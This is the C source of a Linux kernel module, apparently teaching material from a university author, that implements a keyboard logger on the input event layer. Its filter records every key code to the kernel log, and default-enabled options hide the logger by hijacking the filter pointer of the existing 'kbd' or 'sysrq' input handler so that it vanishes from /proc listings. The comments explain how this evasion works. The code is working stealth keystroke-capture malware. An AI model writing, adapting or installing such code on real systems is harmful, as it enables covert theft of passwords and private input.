#include <linux/slab.h>		/* Memory allocation used */
#include <linux/input.h>
#include <linux/string.h>	/* Cannot use C library... */
#include <linux/kernel.h>	/* We're doing kernel work */
#include <linux/module.h>	/* Specifically, a module */

MODULE_DESCRIPTION("Example module: Keyboard logger on event layer.");
MODULE_AUTHOR("Michael Sonntag <michael.sonntag@ins.jku.at>");
MODULE_LICENSE("GPL");

/* Generally modeled after linux/drivers/tty/vt/keyboard.c */

#define HIDE_HANDLER
#define HIDE_HANDLER_COMPLEX	// MUST also define HIDE_HANDLER!
#if defined HIDE_HANDLER_COMPLEX && !defined HIDE_HANDLER
	#warning "HIDE_HANDLER needs to be defined when HIDE_HANDLER_COMPLEX is used"
	#define HIDE_HANDLER
#endif

#define DEVICE_NAME "AT Translated Set 2 keyboard"
#define KBD_HANDLER "kbd"
#define SYSRQ_HANDLER "sysrq"

#ifndef HIDE_HANDLER
// We are handling only a single device, so we can use a static handle; otherwise -> kzalloc
static struct input_handle handle;
#endif /* HIDE_HANDLER */

#ifdef HIDE_HANDLER_COMPLEX
// Spinlock: we may not call/check/modify the old pointer simultaneously
static DEFINE_SPINLOCK(oldFilter_lock);
// For storing the old filter procedure pointer to be called after we "handled" the key press
static bool (*oldFilter)(struct input_handle *handle, unsigned int type, unsigned int code, int value)=NULL;
#endif /* HIDE_HANDLER_COMPLEX */


/* Modeled after linux/drivers/tty/vt/keyboard.c --> kbd_connect 
 * (almost identical)
 */
static int myConnect(struct input_handler *handler, struct input_dev *dev,const struct input_device_id *id) {
/* If hiding, we don't need to connect anything. We only need to register the handler.
 * But the connect function is ALWAYS called (no NULL check), so we have to provide one even if it does nothing.
 * The only other chance would be to ensure that we never ever match any device at all...
 */
#ifndef HIDE_HANDLER
	int error;
	/* Select which device to use; we could also monitor all of them 
	 * and then check whether they produce key events and handle those.
	 * But then we have to indicate where they came from to avoid confusion...
	 */
	if(strcasecmp(dev->name,DEVICE_NAME)) {
		return 0;
	}
	printk(KERN_INFO "Connect to device \"%s\"\n",dev->name);
	/* Output list without filtering on a Virtualbox machine:
	[15541.933362] Connect device Power Button
	[15541.933364] Connect device Sleep Button
	[15541.933369] Connect device AT Translated Set 2 keyboard
	[15541.933372] Connect device ImExPS/2 Generic Explorer Mouse
	[15541.933375] Connect device Video Bus
	[15541.933381] Connect device VirtualBox mouse integration
	[15541.933384] Connect device PC Speaker
	*/	
	// Fill our handle with the info; note we only have a single one
	handle.dev=dev;
	handle.handler=handler;
	handle.name="logger";	// Used in input_devices_seq_show for printing
	/* Shown in /proc/bus/input/devices:
I: Bus=0011 Vendor=0001 Product=0001 Version=ab41
N: Name="AT Translated Set 2 keyboard"
P: Phys=isa0060/serio0/input0
S: Sysfs=/devices/platform/i8042/serio0/input/input2
U: Uniq=
H: Handlers=logger sysrq kbd leds event2 
B: PROP=0
B: EV=120013
B: KEY=402000000 3803078f800d001 feffffdfffefffff fffffffffffffffe
B: MSC=10
B: LED=7
     * After adding out keylogger	 
I: Bus=0011 Vendor=0001 Product=0001 Version=ab41
N: Name="AT Translated Set 2 keyboard"
P: Phys=isa0060/serio0/input0
S: Sysfs=/devices/platform/i8042/serio0/input/input2
U: Uniq=
H: Handlers=sysrq kbd leds event2 
B: PROP=0
B: EV=120013
B: KEY=402000000 3803078f800d001 feffffdfffefffff fffffffffffffffe
B: MSC=10
B: LED=7
	 * To get out of this list we would have to "hijack" a different handle, e.g. the "kbd" (or overwrite the "input_devices_seq_show" function!)
	 * This is not necessary if we do it as below and do not use our own handler - and therefore no handle too - at all!
	 */
	// Register the handle
	error=input_register_handle(&handle);
	if(error) {
		printk(KERN_ERR "Could not register handle\n");
		return error;
	}
	// Open it (=connect device and handler)
	error=input_open_device(&handle);
	if(error) {
		// Cleanup
		input_unregister_handle(&handle);
		printk(KERN_ERR "Could not open handle\n");
		return error;
	}
#endif /* HIDE_HANDLER */
	return 0;
}

/* Modeled after linux/drivers/tty/vt/keyboard.c --> kbd_disconnect
 * (practically identical)
 */
static void myDisconnect(struct input_handle *handle) {
// No longer needed if hiding - we don't register/open anything then
#ifndef HIDE_HANDLER
	if(handle==NULL) {
		return;
	}
	printk(KERN_INFO "Disconnect from device \"%s\"\n",handle->dev->name);
	input_close_device(handle);
	input_unregister_handle(handle);
	// Set to NULL for safety; do NOT do this before unregistering it (->crash)!
	handle->dev=NULL;
	handle->handler=NULL;
#endif /* HIDE_HANDLER */	
}

// Official documentation is not always that helpful ;-) :
///**
// * struct input_value - input value representation
// * @type: type of value (EV_KEY, EV_ABS, etc)
// * @code: the value code
// * @value: the value
// */
//struct input_value {
//	__u16 type;
//	__u16 code;
//	__s32 value;
//};

/* https://www.kernel.org/doc/html/latest/input/event-codes.html
 * Type: /include/uapi/linux/input-event-codes.h --> Event types, e.g.
 * 0 = EV_SYN
 * 1 = EV_KEY
 * 2 = EV_REL
 * 4 = EV_MSC
 * Code: /include/uapi/linux/input-event-codes.h --> Keys and buttons
 */
 
static bool myFilter(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
	// Return true to prevent handling this event -> DO NOT SET THIS VALUE HERE OR KEYBOARD INPUT NO LONGER WORKS!
	bool suppress=false;
	// Keyboard codes: Scancode set 2 (--> "AT Translated Set 2 keyboard")
	// http://kbd-project.org/docs/scancodes/scancodes-1.html
	/* Single keypress produces:
	 * 0,0,0 --> EV_SYN=Sync --> ignore, used to separate events in event stream
	 * 4,4,keycode --> 4 = EV_MSC/Miscellaneous; MSC_RAW; raw keyboard code --> ignore	 
	 * 1,keycode,0/1/2 --> 1 = EV_KEY; key code; 1=Press, 0=Release, 2=Repeat
	 */
	/* Note: This is the keycode, i.e. a number related to the physical location of the key. It
	 * is independent of the glyph printed on top of the cap. E.g. German and English keyboards differ 
	 * regarding the location of the Y/Z keys: German has Z in between T and U on the top row, while 
	 * English has the Y there. But BOTH keyboards will produce keycode 'KEY_Y' = 21 when pressing this 
	 * physical key. Translation according to keyboard layout takes place higher up!
	 */
	/* Take care: Interrupts are disabled at this time and the device spinlock is held, so NO SLEEPING!
	 * We perhaps MIGHT be called from multiple devices simultaneously???
	 */
	if(type==EV_KEY) {
		printk(KERN_INFO "Keycode: Code=%d Value=%d\n",code,value);
	}
#ifdef HIDE_HANDLER_COMPLEX
	// We have to call the old filter function
	spin_lock(&oldFilter_lock);
	if(likely(oldFilter!=NULL)) {
		// Call previous filter
		suppress=oldFilter(handle,type,code,value);
	}
	spin_unlock(&oldFilter_lock);
#endif /* HIDE_HANDLER_COMPLEX */	
	return suppress;
}


/* What kind of device ids this filter handles
 * input_register_device will only try to connect us to devices
 * which match this filter, i.e. provide these kinds of events.
 * Lots of filtering possible: see linux/include/linux/mod_devicetable.h
 * We are only interested in things that produce key events.
 */
static const struct input_device_id idsOfInterest[] = {
	{
		.flags = INPUT_DEVICE_ID_MATCH_EVBIT,
		.evbit = { BIT_MASK(EV_KEY) },
	},
	{ },    /* Terminating entry */
};

/* Used to generate information used for hot-plugging and map files.
 * Not strictly needed here, as we don't do any of these things: manual
 * loading only. The keylogger also works without.
 */
MODULE_DEVICE_TABLE(input,idsOfInterest);

/*
 * @event: event handler. This method is being called by input core with
 *	interrupts disabled and dev->event_lock spinlock held and so
 *	it may not sleep
 * @filter: similar to @event; separates normal event handlers from
 *	"filters".
 * @connect: called when attaching a handler to an input device
 * @disconnect: disconnects a handler from input device 
 * @name: name of the handler, to be shown in /proc/bus/input/handlers
 * @id_table: pointer to a table of input_device_ids this driver can
 *	handle 
 * @h_list: list of input handles associated with the handler 
 * @node: for placing the driver onto input_handler_list
*/ 
static struct input_handler inputHandler={
	.name		= "Keylogger-Handler",
	.connect	= myConnect,
	.disconnect	= myDisconnect,
	.filter		= myFilter,
	.id_table	= idsOfInterest,
};


// Module initialization
static int logger_init(void) {
#ifdef HIDE_HANDLER
	struct input_handler *h;
#endif /* HIDE_HANDLER */
	/* Very low level: This is the same as the keyboard handler, just above the keyboard driver
	 * (on PCs: i8042+...)
	 * Sequence:
	 * linux/drivers/input/serio/i8042.c --> i8042_interrupt (=Interrupt handler; each keypress
	 *                                       produces an interrupt from the physical keyboard)
	 * linux/drivers/input/serio/serio.c --> serio_interrupt
	 * linux/drivers/input/keyboard/atkbd.c --> atkbd_interrupt
		* input_event(dev, EV_MSC, MSC_RAW, code);
		* code = atkbd_compat_scancode(atkbd, code);
		* keycode = atkbd->keycode[code];
		* Set value based on press/release/time elapsed
		* input_event(dev, EV_KEY, keycode, value);
	 * linux/drivers/input/input.c --> input_event
	 * linux/drivers/input/input.c --> input_handle_event
	 * linux/drivers/input/input.c --> input_pass_values 
	 *                                 (goes through all handles associated with the device)
	 * linux/drivers/input/input.c --> input_to_handler 
	 *                                 (gets the handler from the handle and calls the function)
	 * This calls our filter function (and later on the "events" function; but we don't 
	 * define/use that one)
	 * Useful links: 
	 * https://elixir.bootlin.com/linux/latest/source/drivers/input/serio/i8042.c
	 * https://elixir.bootlin.com/linux/latest/source/drivers/input/serio/serio.c
	 * https://elixir.bootlin.com/linux/latest/source/drivers/input/keyboard/atkbd.c
	 * https://elixir.bootlin.com/linux/latest/source/include/linux/input.h
	 * https://elixir.bootlin.com/linux/latest/source/drivers/input/input.c
	 * https://elixir.bootlin.com/linux/latest/source/drivers/tty/vt/keyboard.c
	 */	 
	int res=input_register_handler(&inputHandler);
	if(res) {
		printk(KERN_ERR "Could not register input handler: %d\n",res);
		return res;
	}		
#ifdef HIDE_HANDLER
	list_for_each_entry(h,&inputHandler.node,node) {
		// h->name!=NULL is important: going through all entries will also reach the list head, which is not used and has a NULL 
		// pointer for the name; this leads to a crash if we don't check. Finding the head is not possible generically;
		// here we can determine it by the NULL name, but we just ignore it and circle the whole list skipping that one.
#ifndef HIDE_HANDLER_COMPLEX
		if(h->name!=NULL && !strcmp(h->name,KBD_HANDLER)) {
			/* Important: "%p" produces hashed values to ensure hiding actual kernel addresses. But here
			 * we really want the address (to see NULL or something else), so we must use %px!
			 * Should NOT be used in practice, as %p still allows comparing two pointers correctly and
			 * most of the time the absolute value is really not useful anyway (except to attackers!).
			 */
			printk(KERN_INFO "Keyboard logger: Keyboard handler \"%s\" found; filter: %px\n",h->name,h->filter);
			if(h->filter==NULL) {
				h->filter=myFilter;
				printk(KERN_INFO "Keyboard logger: Filter inserted\n");
			} else {
				printk(KERN_ERR "Keyboard logger: Filter already set\n");
			}
		}
#else	// Complex hiding
		if(h->name!=NULL && !strcmp(h->name,SYSRQ_HANDLER)) {
			unsigned long flags;
			printk(KERN_INFO "Keyboard logger: SysRq handler \"%s\" found; filter: %px\n",h->name,h->filter);
			spin_lock_irqsave(&oldFilter_lock,flags);
			if(h->filter!=myFilter) {
				oldFilter=h->filter;
				h->filter=myFilter;
				spin_unlock_irqrestore(&oldFilter_lock,flags);
				printk(KERN_INFO "Keyboard logger: Filter replaced\n");
			} else {
				spin_unlock_irqrestore(&oldFilter_lock,flags);
				printk(KERN_ERR "Keyboard logger: Filter already replaced\n");
			}
		}
#endif /* HIDE_HANDLER_COMPLEX */			
	}		
	// Now immediately unregister again - but return 0 (the module started successfully!)
	input_unregister_handler(&inputHandler);
#endif /* HIDE_HANDLER */			
	/* 	Shown in /proc/bus/input/handlers:
N: Number=0 Name=kbd
N: Number=1 Name=sysrq (filter)
N: Number=2 Name=leds
N: Number=3 Name=mousedev Minor=32
N: Number=4 Name=evdev Minor=64
N: Number=5 Name=joydev Minor=0
N: Number=6 Name=Keylogger-Handler (filter)
	 * To get out of this list we have to "attach" to an existing handler, e.g. "kbd". This one does not define a filter...
	 * No direct access to the list, as it is static. But we can register, as then we get access via handler(=ourself)->node
	 * to the circular list of all handlers. Afterwards we immediately unregister to keep our presence as short as possible.
	 * Note that we then also do not need a handler (we occupy the unused filter!), so we don't have to hide that one!
	 * The output is now VERY similar and changes from:
	 * N: Number=0 Name=kbd
	 * to
	 * N: Number=0 Name=kbd (filter)
	 * as the normal kbd driver has now a filter too.
	 * We DO still show up as a module in lsmod - but only as "kbd" (which is quite innocuous)
	 */
	printk(KERN_INFO "Keyboard logger added: %s\n",res?"FAIL":"Success");
	return res;
}

// Module cleanup; we simply unregister our handler
static void logger_cleanup(void) {
#ifdef HIDE_HANDLER
	struct input_handler *h;
	int res;
	res=input_register_handler(&inputHandler);
	if(res) {
		printk(KERN_ERR "Could not register input handler for cleanup: %d\n",res);
		return;
	}
	list_for_each_entry(h,&inputHandler.node,node) {
#ifndef HIDE_HANDLER_COMPLEX
		if(h->name!=NULL && !strcmp(h->name,KBD_HANDLER)) {
			printk(KERN_INFO "Keyboard logger: Keyboard handler \"%s\" found; filter: %px\n",h->name,h->filter);
			if(h->filter==myFilter) {
				h->filter=NULL;
				printk(KERN_INFO "Keyboard logger: Filter removed\n");
			} else {
				printk(KERN_ERR "Keyboard logger: Filter is not ours!\n");
			}
		}
#else	// Complex hiding
		if(h->name!=NULL && !strcmp(h->name,SYSRQ_HANDLER)) {
			unsigned long flags;
			printk(KERN_INFO "Keyboard logger: SysRq handler \"%s\" found; filter: %px\n",h->name,h->filter);		
			spin_lock_irqsave(&oldFilter_lock,flags);
			if(h->filter==myFilter) {
				h->filter=oldFilter;
				oldFilter=NULL;
				spin_unlock_irqrestore(&oldFilter_lock,flags);
				printk(KERN_INFO "Keyboard logger: Filter restored\n");
			} else {
				spin_unlock_irqrestore(&oldFilter_lock,flags);
				printk(KERN_ERR "Keyboard logger: Filter is not ours!\n");
			}
		}
#endif /* HIDE_HANDLER_COMPLEX */
	}
#endif /* HIDE_HANDLER */
	input_unregister_handler(&inputHandler);
	printk(KERN_INFO "Keyboard logger removed\n");
}

// Module initialization/finalization functions
module_init(logger_init);
module_exit(logger_cleanup);
